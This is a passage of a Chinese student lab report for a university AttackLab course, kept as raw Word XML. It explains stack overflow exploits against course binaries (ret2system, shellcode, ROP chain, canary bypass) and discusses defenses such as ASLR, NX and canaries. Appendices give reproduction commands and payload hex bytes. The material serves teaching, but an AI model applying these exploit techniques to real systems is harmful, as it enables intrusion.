        <w:t xml:space="preserve"> 放到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expression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的低地址方向，例如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struct log_frame { int len; char expression[128]; char logMsg[128]; };</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。这样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gets(expression)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 向高地址溢出时永远碰不到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len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memcpy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的目标始终是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logMsg + 0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把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logMsg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 放到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expression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之前，并让 canary 紧跟在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expression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之后。这样任何想改写返回地址的线性溢出都必须先穿过 canary，被 Stack Protector 检测到。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更彻底的做法是不把长度作为可写的结构体字段：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memcpy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的目标直接用固定偏移/常量，或把长度放在寄存器、只读变量中；同时用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fgets(buf, sizeof buf, stdin)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 替代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，并开启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-D_FORTIFY_SOURCE=2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为什么重排有效？因为栈溢出是单向的：从低地址缓冲区向高地址写。把控制写目标的元数据放在缓冲区低地址侧，它就位于溢出路径的“身后”，线性溢出无法触及；把 canary 紧贴缓冲区高地址侧，则任何继续向前的覆盖都会先破坏 canary。这两条合起来，才能让“改长度 + 二次写”的利用链失效。</w:t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9  ASLR、NX 与防御讨论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9.1  ASLR 的直观观察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编译并多次运行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aslr.c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，每次打印的局部变量地址都不同：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0x7ffd7b987274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0x7ffde4281de4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0x7ffcb78aec14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0x7fff25bdc214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0x7ffc9e933ca4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0x7ffddc54ce84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0x7fff802e4f94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0x7fffb63d0884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22  8 次运行 aslr 得到的栈地址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地址的低 12 位（页内偏移）保持不变，高位随机变化，说明随机化的是栈的基址。在 GDB 中连续两次运行，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&amp;i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 都是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0x7fffffffe3f4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，因为 GDB 为了方便调试默认关闭了 ASLR；这也解释了为什么在 GDB 里看到的栈地址不能直接硬编码到真实运行的 payload 中。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9.2  NX、Non-PIE 与 ROP 的关系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任务二之所以能成功，是因为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dark-calc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 主动用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mmap(PROT_EXEC)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 造了一个可执行栈，并且把它固定在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0x721000000000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。真实系统通常不会这样做：栈是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RW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的，NX 位会阻止在栈上取指；同时 ASLR 会让栈地址每次运行都不同。任务三、四就是在这个更现实的设定下做的：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b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dark-calc-nx</w:t>
      </w:r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dark-log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的栈不可执行，因此不能放 shellcode；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两者都是 Non-PIE，代码段地址固定，因此可以在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.text</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中找 gadget；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b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dark-log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 还加了 canary，于是需要先绕过 canary，再走 ROP。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这也解释了实验文档中“楚门的世界”的含义：任务二的成功依赖于两个被故意关闭/绕过的保护（栈可执行、栈地址固定），并不是现代系统上的通用攻击方式。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:keepNext/>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>9.3  分层防御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从本实验可以看到，单一机制往往不够，实际系统需要多层防御：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机制</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3061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阻止的攻击</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3742"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864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本实验中的体现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边界检查 /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fgets</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="30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从源头阻止越界写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gets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是任务一至四的共同根源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Stack Protector (canary)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="30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检测返回地址前的栈破坏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任务四的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dark-log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NX / 不可执行栈</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="30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阻止在栈上执行 shellcode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任务三、四的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GNU_STACK RW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ASLR / PIE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="30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让绝对地址不可预测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任务三、四的栈随机；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aslr.c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RELRO / 只读 GOT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="30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阻止改写函数指针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本实验未重点涉及，但属于同类思路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代码审计 / 避免 </w:t>
            </w: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system</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3061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减少命令注入面</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3742"/>
            <w:vAlign w:val="center"/>
            <w:tcMar>
              <w:top w:w="40" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="40" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F5F9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A61B29"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>eval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直接拼接用户输入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表 14  分层防御与本实验的对应关系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值得注意的是，canary、NX、ASLR 都不是“绝对安全”：任务四绕过了 canary，ROP 绕过了 NX，信息泄露可以绕过 ASLR。安全是一个持续对抗的过程，这也是实验文档“猫鼠游戏”想表达的意思。</w:t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10  总结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本实验从调用栈的建立过程出发，逐步展示了栈缓冲区溢出如何破坏返回地址，以及四种不同保护程度下的利用方式。主要结论如下：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>call</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 压入返回地址，prologue 保存调用者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 并分配局部变量，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leave</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 恢复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rsp/rbp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弹出返回地址；返回地址位于缓冲区高地址方向，是栈溢出的直接目标。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任务一利用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strcpy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\0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 处停止的特性，把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./malware\0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 放进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command_buf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，再跳到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eval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system</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用点，完成 ret2system。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任务二利用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dark-calc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 故意映射的固定可执行栈，把 16 字节 shellcode 放在缓冲区，通过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push imm32; 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调用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grade_eval(4)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，并处理了栈对齐。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任务三在 NX + 栈 ASLR 下，使用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0x401a33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pop rdi; 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0x401a34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组成 ROP 链，调用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grade_eval(4)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">；额外的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ret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 解决了 glibc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printf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的对齐问题。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="4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任务四利用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 改写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len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，把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memcpy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的目标从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logMsg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 抬到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rbp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，在不碰 canary 的情况下覆盖返回地址；重排局部变量、把 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 放到缓冲区低地址侧、让 canary 紧贴缓冲区，可以防御这种利用。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最终四个 payload 均在本地通过，输出与模板 workflow 的期望字符串一致。实验报告中所有 GDB 现场均来自同一次可复现的运行；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>attack/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下的二进制保持原样，未做任何 patch。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr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本地验证结果：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payload.py → dark-calc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payload_dark.py → dark-calc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payload_rop.py → dark-calc-nx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61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload_canary.py → dark-log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 四组均为 PASS，目标 stdout 中都出现了模板 workflow 要求的字符串。</w:t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附录 A  复现命令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cd AttackLab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python3 payload.py &gt; /tmp/p1.bin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(cd attack &amp;&amp; ./dark-calc &lt; /tmp/p1.bin)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python3 payload_dark.py &gt; /tmp/p2.bin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(cd attack &amp;&amp; ./dark-calc &lt; /tmp/p2.bin)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python3 payload_rop.py &gt; /tmp/p3.bin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(cd attack &amp;&amp; ./dark-calc-nx &lt; /tmp/p3.bin)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python3 payload_canary.py &gt; /tmp/p4.bin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(cd attack &amp;&amp; ./dark-log &lt; /tmp/p4.bin)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23  四个任务的复现命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="80" w:line="317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GDB 观察调用栈时使用：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gdb -q ./attack/dark-calc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(gdb) set disassembly-flavor intel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(gdb) b *0x40197f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(gdb) run &lt; /tmp/in1.txt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(gdb) bt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(gdb) info registers rip rbp rsp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(gdb) x/8gx $rbp-0x10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24  观察 input 栈帧的 GDB 命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext/>
        <w:spacing w:before="320" w:after="160"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="4" w:color="2F5597"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="1F3864"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>附录 B  payload 十六进制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single" w:sz="18" w:space="0" w:color="2F5597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9184"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F4F6F8"/>
            <w:tcMar>
              <w:top w:w="80" w:type="dxa"/>
              <w:left w:w="140" w:type="dxa"/>
              <w:bottom w:w="8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payload.py (32 B)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2e2f 6d61 6c77 6172 6500 4141 4141 4141  ./malware.AAAAAA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4242 4242 4242 4242 6b1a 4000 0000 0000  BBBBBBBBk.@.....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payload_dark.py (32 B)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bf04 0000 0068 c31a 4000 6887 1a40 00c3  .....h..@.h..@..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4343 4343 4343 4343 d00f 8000 1072 0000  CCCCCCCC.....r..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payload_rop.py (64 B)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4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA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4444 4444 4444 4444 331a 4000 0000 0000  DDDDDDDD3.@.....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0400 0000 0000 0000 341a 4000 0000 0000  ........4.@.....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7819 4000 0000 0000 b419 4000 0000 0000  x.@.......@.....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payload_canary.py (260 B)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4545 4545 4545 4545 a318 4000 0000 0000  EEEEEEEE..@.....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0400 0000 0000 0000 a418 4000 0000 0000  ..........@.....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7716 4000 0000 0000 f517 4000 0000 0000  w.@.......@.....</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1A1A1A"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>4646 ... (填充到 0xff) ... a000 0000        FF........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/>
          <w:color w:val="7F7F7F"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>代码 25  四个 payload 的关键字节</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="80" w:line="317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（报告完）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595959"/>
        <w:sz w:val="17"/>
      </w:rPr>
      <w:t xml:space="preserve">ICS 2026 Fall · Lab3 AttackLab · 第 </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="595959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 w:eastAsia="宋体"/>
        <w:b w:val="0"/>
        <w:i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595959"/>
        <w:sz w:val="17"/>
      </w:rPr>
      <w:t>复旦大学 计算机系统基础（2026 年秋季学期）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